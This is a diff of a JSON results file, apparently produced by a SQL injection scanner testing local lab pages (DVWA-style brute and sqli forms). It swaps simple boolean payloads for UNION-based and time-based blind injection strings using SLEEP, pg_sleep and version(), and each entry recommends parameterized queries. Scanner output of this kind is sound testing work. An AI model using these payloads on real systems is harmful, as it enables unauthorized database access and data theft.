@@ -4,7 +4,7 @@
         "form_action": "http://localhost/vulnerabilities/brute/",
         "method": "get",
         "vulnerable_input": "username",
-        "payload": "1 AND '1'=1--",
+        "payload": "' AND 1=1 --",
         "error_detected": "Database error message found",
         "remediation": "Use parameterized queries (prepared statements)."
     },
@@ -13,7 +13,7 @@
         "form_action": "http://localhost/vulnerabilities/brute/",
         "method": "get",
         "vulnerable_input": "username",
-        "payload": "1' UNION SELECT NULL, NULL--",
+        "payload": "' OR 1<2 union select null,version()",
         "error_detected": "Database error message found",
         "remediation": "Use parameterized queries (prepared statements)."
     },
@@ -22,7 +22,7 @@
         "form_action": "http://localhost/vulnerabilities/brute/",
         "method": "get",
         "vulnerable_input": "username",
-        "payload": "1' AND '1'=1--",
+        "payload": "' AND (SELECT%20SLEEP(5))--",
         "error_detected": "Database error message found",
         "remediation": "Use parameterized queries (prepared statements)."
     },
@@ -31,7 +31,7 @@
         "form_action": "http://localhost/vulnerabilities/brute/",
         "method": "get",
         "vulnerable_input": "username",
-        "payload": "1' OR 1=1 /*",
+        "payload": "' UNION SELECT NULL,(SELECT%60IF(1=1,SLEEP(5),SLEEP(0)%60)--",
         "error_detected": "Database error message found",
         "remediation": "Use parameterized queries (prepared statements)."
     },
@@ -40,7 +40,34 @@
         "form_action": "http://localhost/vulnerabilities/brute/",
         "method": "get",
         "vulnerable_input": "username",
-        "payload": "1 AND '1'='1'/*",
+        "payload": "' OR 1=(SELECT%20CASE%20WHEN%201=1%20THEN%20SLEEP(5)%20ELSE%20SLEEP(0)%20END)",
+        "error_detected": "Database error message found",
+        "remediation": "Use parameterized queries (prepared statements)."
+    },
+    {
+        "url": "http://localhost/vulnerabilities/brute/",
+        "form_action": "http://localhost/vulnerabilities/brute/",
+        "method": "get",
+        "vulnerable_input": "username",
+        "payload": "' UNION SELECT NULL,(SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
+        "error_detected": "Database error message found",
+        "remediation": "Use parameterized queries (prepared statements)."
+    },
+    {
+        "url": "http://localhost/vulnerabilities/brute/",
+        "form_action": "http://localhost/vulnerabilities/brute/",
+        "method": "get",
+        "vulnerable_input": "username",
+        "payload": "' UNION ALL SELECT NULL,SLEEP(5)--",
+        "error_detected": "Database error message found",
+        "remediation": "Use parameterized queries (prepared statements)."
+    },
+    {
+        "url": "http://localhost/vulnerabilities/brute/",
+        "form_action": "http://localhost/vulnerabilities/brute/",
+        "method": "get",
+        "vulnerable_input": "username",
+        "payload": "' OR 1<2 union select null,md5('test')--,null--",
         "error_detected": "Database error message found",
         "remediation": "Use parameterized queries (prepared statements)."
     },
@@ -49,7 +76,7 @@
         "form_action": "http://localhost/vulnerabilities/sqli/",
         "method": "get",
         "vulnerable_input": "id",
-        "payload": "1 AND '1'=1--",
+        "payload": "' AND 1=1 --",
         "error_detected": "Database error message found",
         "remediation": "Use parameterized queries (prepared statements)."
     },
@@ -58,7 +85,7 @@
         "form_action": "http://localhost/vulnerabilities/sqli/",
         "method": "get",
         "vulnerable_input": "id",
-        "payload": "1' UNION SELECT NULL, NULL--",
+        "payload": "' OR 1<2 union select null,version()",
         "error_detected": "Database error message found",
         "remediation": "Use parameterized queries (prepared statements)."
     },
@@ -67,7 +94,7 @@
         "form_action": "http://localhost/vulnerabilities/sqli/",
         "method": "get",
         "vulnerable_input": "id",
-        "payload": "1' AND '1'=1--",
+        "payload": "' AND (SELECT%20SLEEP(5))--",
         "error_detected": "Database error message found",
         "remediation": "Use parameterized queries (prepared statements)."
     },
@@ -76,7 +103,7 @@
         "form_action": "http://localhost/vulnerabilities/sqli/",
         "method": "get",
         "vulnerable_input": "id",
-        "payload": "1' OR 1=1 /*",
+        "payload": "' UNION SELECT NULL,(SELECT%60IF(1=1,SLEEP(5),SLEEP(0)%60)--",
         "error_detected": "Database error message found",
         "remediation": "Use parameterized queries (prepared statements)."
     },
@@ -85,7 +112,34 @@
         "form_action": "http://localhost/vulnerabilities/sqli/",
         "method": "get",
         "vulnerable_input": "id",
-        "payload": "1 AND '1'='1'/*",
+        "payload": "' OR 1=(SELECT%20CASE%20WHEN%201=1%20THEN%20SLEEP(5)%20ELSE%20SLEEP(0)%20END)",
+        "error_detected": "Database error message found",
+        "remediation": "Use parameterized queries (prepared statements)."
+    },
+    {
+        "url": "http://localhost/vulnerabilities/sqli/",
+        "form_action": "http://localhost/vulnerabilities/sqli/",
+        "method": "get",
+        "vulnerable_input": "id",
+        "payload": "' UNION SELECT NULL,(SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
+        "error_detected": "Database error message found",
+        "remediation": "Use parameterized queries (prepared statements)."
+    },
+    {
+        "url": "http://localhost/vulnerabilities/sqli/",
+        "form_action": "http://localhost/vulnerabilities/sqli/",
+        "method": "get",
+        "vulnerable_input": "id",
+        "payload": "' UNION ALL SELECT NULL,SLEEP(5)--",
+        "error_detected": "Database error message found",
+        "remediation": "Use parameterized queries (prepared statements)."
+    },
+    {
+        "url": "http://localhost/vulnerabilities/sqli/",
+        "form_action": "http://localhost/vulnerabilities/sqli/",
+        "method": "get",
+        "vulnerable_input": "id",
+        "payload": "' OR 1<2 union select null,md5('test')--,null--",
         "error_detected": "Database error message found",
         "remediation": "Use parameterized queries (prepared statements)."
     }
